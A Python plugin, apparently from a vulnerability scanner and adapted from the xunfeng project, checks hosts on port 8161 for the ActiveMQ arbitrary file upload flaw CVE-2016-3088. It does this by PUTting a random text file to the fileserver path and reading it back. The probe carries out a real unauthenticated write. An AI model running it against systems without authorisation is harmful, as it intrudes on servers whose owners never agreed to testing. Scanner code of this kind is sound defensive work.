#!/usr/bin/env python
# -*- coding:utf-8 -*-
# Reference: https://github.com/ysrc/xunfeng/blob/master/vulscan/vuldb/activemq_upload.py

class VulnChecker(VulnCheck):
    def __init__(self, ip_and_port_list):
        self._name = 'activemq_upload'
        self.info = "Check the ActiveMQ arbitrary file upload CVE-2016-3088"
        self.keyword = ['all', 'activemq', 'file_upload', 'web', 'intranet', 'danger', '8161', 'cve_2016_3088',]
        self.default_ports_list = [8161, ]
        VulnCheck.__init__(self, ip_and_port_list)

    def _check(self, ip, port):
        file_name = file_content = random8string()
        url1 = "http://%s:%d/fileserver/%s.txt"%(ip, int(port), file_name) if add_web_path == "" else "http://%s:%d/%s/fileserver/%s.txt"%(ip, int(port), add_web_path, file_name)
        url2 = "https://%s:%d/fileserver/%s.txt"%(ip, int(port), file_name) if  add_web_path == "" else "https://%s:%d/%s/fileserver/%s.txt"%(ip, int(port), add_web_path, file_name)

        try:
            req = Requester(url1, method='put', data={'test':file_content})
            req_get = Requester(url1, method='get')
            if req.code == 204 or (req_get.code == 200 and check_200_or_404(url1) and file_content in str(req_get.html)):
                result = "exists ActiveMQ arbitrary file upload, check url: %s"%(url1)
                self._output(ip, port, result)
        except RequesterOpenError:
            try:
                req = Requester(url2, method='put', data={'test':file_content})
                req_get = Requester(url2, method='get')
                if req.code == 204 or (req_get.code == 200 and check_200_or_404(url2) and file_content in str(req_get.html)):
                    result = "exists ActiveMQ arbitrary file upload, check url: %s"%(url2)
                    self._output(ip, port, result)
            except:
                pass
        except:
            pass

globals()['VulnChecker'] = VulnChecker